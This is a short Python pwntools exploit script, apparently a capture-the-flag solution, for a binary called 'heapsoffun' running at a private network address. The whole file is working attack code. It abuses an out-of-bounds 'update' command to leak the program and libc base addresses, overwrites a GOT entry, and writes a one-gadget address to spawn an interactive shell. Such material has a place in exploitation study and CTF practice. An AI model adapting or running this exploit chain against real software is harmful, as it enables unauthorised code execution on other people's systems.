from pwn import *

s = remote('192.168.0.85',1234)
def accumuler(size,dat):
  s.recvuntil('>')
  s.send('accumuler\n')
  s.recvuntil('Length:')
  s.send(str(size)+'\n')
  s.recvuntil('Data:')
  s.send(dat)
def update(index,byte,value):
  s.recvuntil('>')
  s.send('update\n')
  s.recvuntil('Index:')
  s.send(str(index)+'\n')
  s.recvuntil('Byte:')
  s.send(str(byte)+'\n')
  s.recvuntil('Value:')
  s.send(str(value)+'\n')
elf = ELF('heapsoffun_5ee5b2cde811e617cd789c73c1d8d2d9e8b27c36')
accumuler(4,'1234\n')
s.recvuntil('>')
s.send('toggle\n')
update(0,-0x1c,0x18)
s.recvuntil('>')
s.send('bilan\n')
elf_base = u64(s.recvuntil('>')[-2-8:-2]) - 0x21c0
log.info('ELF : 0x%x '%elf_base)
compare_got = elf_base + elf.got['_ZNSsD1Ev']
s.send('bilan\n')
s.send('select\n')
s.recvuntil('Enter user:')
s.send('victim\n')
update(0,-0x1c,0xffff)
accumuler(4,'1234\n')
update(0,0x5c,int(hex(compare_got)[-2:],16))
for i in range(1,6):
  temp = hex(compare_got)[-2-2*i:-2*i]
  update(0,0x5c+i,int('0x'+temp,16))
update(0,0x54,0x8)
s.recvuntil('>')
s.send('bilan\n')
libc = u64(s.recvuntil('>')[-2-8:-2]) - 0x6ae050
magic = libc + 0xef6c4
log.info('LIBC : 0x%x'%libc)
print hex(magic)
s.send('bilan\n')
update(0,0x28,int(hex(magic)[-2:],16))
for i in range(1,6):
  temp = hex(magic)[-2-2*i:-2*i]
  print temp
  update(0,0x28+i,int('0x'+temp,16))
s.interactive()
